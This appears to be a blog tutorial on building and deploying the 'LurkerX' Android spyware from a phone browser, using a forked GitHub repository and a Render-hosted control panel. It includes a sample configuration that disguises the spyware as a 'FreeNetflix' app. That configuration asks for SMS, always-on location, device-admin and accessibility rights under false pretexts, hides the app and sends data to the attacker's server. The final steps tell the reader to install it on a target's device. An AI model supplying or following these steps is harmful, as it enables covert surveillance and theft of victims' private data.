 # How to Spy on any Android phone using just Chrome or Safari, October 2026

 <div class="separator" style="clear: both; text-align: center;"><br /></div><a href="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUEcTGfIIpuAuUmHnRuwnjEQDipkyHQNsyMDEvhhimmqmqxyD-skFr3VVisJFIJawzrkcvx_6AQ8y_WlxIBdp8rJZdrk5ix4IT4PcvExNyZS5pMVLJu94JRn94pkkL3TLjenbtq5eW-GLS6eYWG3Ug3bNxPZKWDRvX4vdyMLH9UJOg8niWrFMfN8PX6G-/s1131/Screenshot_20260801987656789.png" style="margin-left: 1em; margin-right: 1em; text-align: center;"><img border="0" data-original-height="791" data-original-width="1131" height="316" src="https://blogger.googleusercontent.com/img/b/R29vZ2xl/AVvXsEjCUEcTGfIIpuAuUmHnRuwnjEQDipkyHQNsyMDEvhhimmqmqxyD-skFr3VVisJFIJawzrkcvx_6AQ8y_WlxIBdp8rJZdrk5ix4IT4PcvExNyZS5pMVLJu94JRn94pkkL3TLjenbtq5eW-GLS6eYWG3Ug3bNxPZKWDRvX4vdyMLH9UJOg8niWrFMfN8PX6G-/w553-h316/Screenshot_20260801987656789.png" width="553" /></a><br /><div><br /></div>

Did you know that you can spy on any Android Phone using just your browser on your own phone?

LurkerX has been a tool people use to generate spywares for Android devices, but for your information it required a PC like a laptop because that was how it was designed. The recent breakthrough is very surprising, With any device that you are using, you can generate a spyware that can be used to spy on other Android devices. In this post, I would list and explain all that you need to know in spying other Androids using the new LurkerX, so miss no glance if you need to learn how to use the new LurkerX.

1. The most neccessary thing to do is to create an account on these two platforms; 

- [**GitHub**](https://github.com)

- [**Render**](https://render.com)

It is those platforms I'd use in this tutorial, though many platforms provides similar services.

2. The next thing to do is to log into your GitHub account, and open this repository link:
[https://github.com/the-hollowclan/LurkerX](https://github.com/the-hollowclan/LurkerX)

3. Fork the repository, step-by-step illustration as shown in the images below:

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-1.PNG?raw=true?raw=true" width="300" height="400">

4. Copy the link to your forked repository. For e.g, mine is https://github.com/nooby-jazy/LurkerX

`https://github.com/noobie-jayz/LurkerX`

5. Now log into your [render.com](https://render.com) account

6. Create a new `web service`

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-2.PNG?raw=true" width="300" height="300">

7. Choose public git repository and enter the link to your GitHub fork. 

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-3.PNG?raw=true" width="300" height="300">

8. Connect and Choose `FREE` instance plan. Then jump to the bottom and click `Deploy web service`

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-4.PNG?raw=true" width="300" height="300">
<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-5.PNG?raw=true" width="300" height="300">

9. Render will generate a link for you. Copy the link

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-6.PNG?raw=true" width="300" height="300">

10. Go back to your GitHub account. Everything is set, you just need to make sure your generated Spyware would forward all data and information to your Render.com URL. 

11. Click on `choices.ini` and edit it. Make sure to change things like `remoteUrl` and `repo_url`.

- `remoteUrl` should be your link from render.com
- `repo_url` should be your forked repo's link. In this case mine is `https://github.com/nooby-jayz/LurkerX`.

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-9.PNG?raw=true" width="300" height="400">
<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-10.PNG?raw=true" width="300" height="400">

You edit this, you edit the spyware behavior.
Don't forget to save it after editing(Also called "Committing" on GitHub)

<img src="https://github.com/the-hollowclan/LurkerX/blob/main/imgs/v1.7.3-12.PNG?raw=true" width="300" height="400">

This is an example of how I made mine:

```ini

[app]
name = FreeNetflix
version = 1.6.0


[content]
icon = icon.PNG?raw=true
countdowntext = "Sit tight and relax while the app configures the system for free and fast internet"

[buttons]
requestpermissions = Enable App Process
requestdeviceadmin = Request Core-Level Rights
enableaccessibility = Enable Accessibility Service

[strings]
telephonypermissionstring = Phone and SMS permissions are needed to enable the service
gpspermissionstring = Allow Location for ALL THE TIME to let the app fake your GPS in background. This is required

[behavior]
remoteurl = https://lurkerx-wo5o.onrender.com
payloadurl = None
hideapp = true

[decompile]
from = base.apk

[public]
repo_url= https://github.com/its-ernest/LurkerX

[sign]
keystore = test.jks
keystore_pass = password
alias =

```

12. After that restart your Panel. To do that, go back to your Render dashboard, select the web service you created, click on `Manual Deploy`. Wait for the deployment to complete successfully(if it shows green tick icon)

13. Open the link Render generated for you. (The link ending in `.onrender.com`)

14. Open the panel and click on `BUILD APP (GITHUB CI)`

15.  You should see the app built, click on it to download

16. After that install it on the target device you aim to monitor
 
17. All information on that device can also be viewed on your `onrender.com` URL portal. 